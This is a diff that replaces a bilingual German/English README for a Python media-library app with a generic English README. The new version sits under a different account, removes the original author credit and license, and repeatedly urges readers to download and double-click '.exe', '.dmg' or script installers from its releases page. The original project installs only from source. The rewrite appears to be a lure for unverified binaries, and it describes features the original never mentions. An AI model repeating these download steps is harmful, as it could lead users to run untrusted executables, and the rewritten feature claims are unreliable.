@@ -1,158 +1,89 @@
-# 📚 Media Information System (MIS) 
-   - (DE/EN)
+# 🎥 Media-Information-System - Effortlessly Manage Your Media Library
 
-| <img width="1280" height="640" alt="M I S" src="https://github.com/user-attachments/assets/2ffd405c-70a4-4f86-b9c8-06954aea20bd" /> |
-|---|
+[![Download Media Information System](https://img.shields.io/badge/Download%20Now-Getting%20the%20App-brightgreen)](https://github.com/huykako/Media-Information-System/releases)
 
----
+## 🚀 Getting Started
 
-Das **Media Information System (MIS)** ist eine moderne, datenbankgestützte Medienverwaltung für:
+Welcome to the Media Information System! This application helps you organize and retrieve information about your media files effortlessly. It works on various platforms and provides a user-friendly interface to make managing your media collection simple.
 
-- 🎬 Filme
-- 🎵 Musik
-- 💻 Programme / Software
-- 📄 Dokumente
+## 📦 System Requirements
 
-Die Anwendung indexiert lokale Verzeichnisse, ruft automatisch Metadaten ab und stellt die Inhalte in einer strukturierten grafischen Benutzeroberfläche dar.
+To run the Media Information System, ensure your computer meets these basic requirements:
 
-MIS unterstützt mehrere Sprachen (DE/EN), bietet eine komfortable Sortierung, eine Druck- bzw. Exportfunktion und eine Integration mit GitHub.
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or higher
+- **Storage:** At least 100 MB of free space
+- **RAM:** 2 GB minimum
 
-<br>
+Ensure your system meets these requirements for the best experience.
 
----
+## 📥 Download & Install
 
-<br>
+To download and install the Media Information System, follow these steps:
 
-### ✨ Hauptfunktionen
+1. Visit the [Releases page](https://github.com/huykako/Media-Information-System/releases).
+2. On this page, look for the latest version.
+3. Download the installation file that matches your operating system. 
 
-| Funktion | Beschreibung |
-|---------|--------------|
-| GUI mit Tabs | Trennung zwischen Film, Musik, Programmen und Dokumenten |
-| Verzeichnisindexierung | Automatisches Scannen von Medienordnern |
-| SQLite-Datenbank | Schnelle und persistente Speicherung der Metadaten |
-| Sprachumschaltung (DE/EN) | Vollständige Runtime-Übersetzung |
-| IMDb-/OMDb-Integration | Automatischer Cover-Download und Filmdaten |
-| Druck-/Exportfunktion | Daten als HTML exportieren und drucken |
-| Dark-Mode | Professionelles modernes UI |
-| GitHub-Integration | Direkte Weiterleitung zum Repository |
+After the download completes:
 
-<br>
+- For Windows, double-click on the `.exe` file.
+- For macOS, open the `.dmg` file and drag the app to your Applications folder.
+- For Linux, extract the archived file and run the provided script.
 
----
+## 🖼️ Application Features
 
-<br>
+The Media Information System comes packed with useful features:
 
-### 🧩 Technologien
+- **Directory Indexing:** Automatically index your media files from specified directories.
+- **Metadata Fetching:** Fetch pertinent metadata from sources like IMDb and OMDb.
+- **Clean GUI:** Enjoy an organized interface with category tabs to easily navigate your media library.
+- **Multilingual Support:** Use the application in your preferred language.
+- **HTML Export:** Easily export your media list as an HTML file for sharing.
 
-| System | Nutzung |
-|--------|---------|
-| Python 3.x | Hauptentwicklung |
-| CustomTkinter | Modernes GUI |
-| SQLite | Datenbank |
-| Requests | API-Anbindung für Filmdaten |
-| Threading | Asynchrone Indexierung |
+These features make it a powerful tool for anyone looking to maintain a media collection effectively.
 
-<br>
+## ⚙️ How to Use
 
----
+Once you have installed the Media Information System, follow these steps to start managing your media collection:
 
-<br>
+1. Launch the application.
+2. Select the directory you want to index.
+3. Click the "Index" button to start. This process may take a few moments depending on the number of files.
+4. After indexing, browse through the categorized tabs to view your data.
+5. Click on any media item to see detailed information, including cast and genre.
 
-### 🛠️ Setup & Installation (Deutsch)
+Take your time exploring the app. It is designed to be intuitive and easy to navigate.
 
-```bash
-pip install customtkinter requests
-python app.py
-```
+## 🛠️ Support
 
-API Key für IMDb-Daten (OMDb API) unter:
-👉 https://www.omdbapi.com
+If you encounter any issues while using the Media Information System, you can find helpful resources:
 
-Im Quellcode einsetzen:
-```python
-OMDB_API_KEY = "DEIN_API_KEY" [Registrierung](https://www.omdbapi.com)
-```
+- Visit the project's [Issue Tracker](https://github.com/huykako/Media-Information-System/issues) to report bugs or request features.
+- Check the [wiki](https://github.com/huykako/Media-Information-System/wiki) for guides and FAQs.
 
+## 🌍 Multilingual Support
 
+The Media Information System supports multiple languages. If you would like to switch the language:
 
-<br>
+1. Open the app.
+2. Go to the settings gear in the top right corner.
+3. Select your preferred language from the dropdown menu.
 
----
+This feature allows users from different backgrounds to easily use the app.
 
-<br>
+## 💡 Helpful Tips
 
-## English
+- **Keep Software Updated:** Regularly check the [Releases page](https://github.com/huykako/Media-Information-System/releases) for updates to ensure you're using the latest features and fixes.
+- **Organize Your Files:** Before indexing, consider organizing your media files into folders by genre or type. This can enhance your browsing experience.
+- **Monitor System Performance:** If the app seems slow, ensure no other heavy applications are running simultaneously.
 
-**Media Information System (MIS)** is a modern database-driven media library application for:
+Following these tips will help you get the most out of the Media Information System.
 
-- 🎬 Movies
-- 🎵 Music
-- 💻 Programs / Software
-- 📄 Documents
+## 📧 Contact
 
-The app indexes directories, fetches metadata automatically, and displays everything in a clean GUI with category tabs.
+For any inquiries or feedback, feel free to reach out via the project's [discussion forum](https://github.com/huykako/Media-Information-System/discussions).
 
-MIS includes multilingual support, printing/exporting features, and GitHub integration.
+## 🎯 Conclusion
 
-<br>
-
----
-
-<br>
-
-### ✨ Key Features
-
-| Feature | Description |
-|--------|-------------|
-| GUI with separate tabs | Movies, Music, Programs, Documents |
-| Directory indexing | Automatic scanning of media folders |
-| SQLite database | Fast and persistent storage |
-| Multilingual UI | DE/EN runtime switching |
-| IMDb/OMDb support | Cover download + movie metadata |
-| Print/Export | HTML export for printing |
-| Dark mode | Modern professional UI |
-| GitHub integration | Quick repository access |
-
-<br>
-
----
-
-<br>
-
-### 🛠️ Setup & Installation (English)
-
-```bash
-pip install customtkinter requests
-python app.py
-```
-
-To enable metadata retrieval, get an OMDb API key:
-👉 https://www.omdbapi.com
-
-Set it in the code:
-```python
-OMDB_API_KEY = "YOUR_API_KEY" [Register](https://www.omdbapi.com)
-```
-
-<br>
-
----
-
-<br>
-
----
-
-## 🏢 Entwickler / Developer
-
- 
-> Owner & Lead Developer:
-  - ©Thorsten Bylicki | ©BYLICKILABS 
-
-<br>
-
----
-
-<br>
-
-## 📄License 
-[LICENSE](LICENSE)
+Thank you for choosing the Media Information System to organize your media library. We hope you enjoy using the application as much as we enjoyed creating it. Don't forget to visit the [Releases page](https://github.com/huykako/Media-Information-System/releases) for new features and updates!
